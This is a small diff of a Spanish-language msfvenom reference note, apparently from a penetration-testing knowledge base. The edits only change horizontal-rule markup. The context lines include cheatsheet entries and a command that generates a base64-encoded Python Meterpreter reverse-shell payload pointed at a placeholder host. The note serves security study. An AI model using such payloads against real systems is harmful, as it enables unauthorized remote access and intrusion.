@@ -27,7 +27,7 @@ linked:
 ---
 # msfvenom
 
-***
+---
 
 ## Cheatsheet
 ^msfvenom
@@ -47,7 +47,7 @@ linked:
 | **List encoders** | `msfvenom -l encoders` |
 | **List formats** | `msfvenom --list formats` |
 
-***
+---
 
 ## Concepto
 
@@ -282,4 +282,4 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=X LPORT=4444 -f raw | base64
 - [OffSec - msfvenom cheatsheet](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
 - [PayloadsAllTheThings - Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
-***
+---
